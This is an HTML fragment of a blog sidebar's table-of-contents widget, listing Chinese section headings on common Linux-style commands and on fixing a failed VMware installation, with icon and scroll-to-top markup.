+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E5%8E%8B"><span class="toc-text">解压</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A7%BB%E5%8A%A8"><span class="toc-text">移动</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%87%8D%E5%91%BD%E5%90%8D"><span class="toc-text">重命名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95"><span class="toc-text">查看文件和目录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C"><span class="toc-text">文件和目录操作</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="toc-text">权限管理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86"><span class="toc-text">系统管理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-text">其他</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86"><span class="toc-text">进程管理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vmware-%E5%AE%89%E8%A3%85%E5%A4%B1%E8%B4%A5%E8%A7%A3%E5%86%B3"><span class="toc-text">VMware 安装失败解决</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3-windows-update"><span class="toc-text">解决 Windows update</span></a></li></ol></li></ol></div><div class="widget-footer">
 
 <a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
 </div></aside><div class='float-panel blur'>
